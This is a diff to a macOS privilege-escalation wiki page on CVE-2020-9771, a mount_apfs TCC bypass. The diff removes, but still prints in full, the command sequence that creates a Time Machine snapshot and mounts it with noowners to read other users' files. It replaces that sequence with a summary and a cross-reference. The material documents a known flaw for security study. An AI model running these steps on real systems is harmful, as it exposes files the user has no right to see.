@@ -355,35 +355,13 @@ Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate
 
 ### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
+**Any user** (even unprivileged ones) can create and mount a Time Machine snapshot with `-o noowners` and **access ALL the files** of that snapshot, bypassing the ownership checks on the live volume. The only privilege needed is for the application used (like `Terminal`) to have **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).
 
-<details>
-<summary>Mount Time Machine snapshot</summary>
+The commands and the full explanation are in the TCC bypasses page:
 
-```bash
-# Create snapshot
-tmutil localsnapshot
-
-# List snapshots
-tmutil listlocalsnapshots /
-Snapshots for disk /:
-com.apple.TimeMachine.2023-05-29-001751.local
-
-# Generate folder to mount it
-cd /tmp # I didn it from this folder
-mkdir /tmp/snap
-
-# Mount it, "noowners" will mount the folder so the current user can access everything
-/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
-
-# Access it
-ls /tmp/snap/Users/admin_user # This will work
-```
-
-</details>
-
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+{{#ref}}
+macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
+{{#endref}}
 
 ## Sensitive Information
 
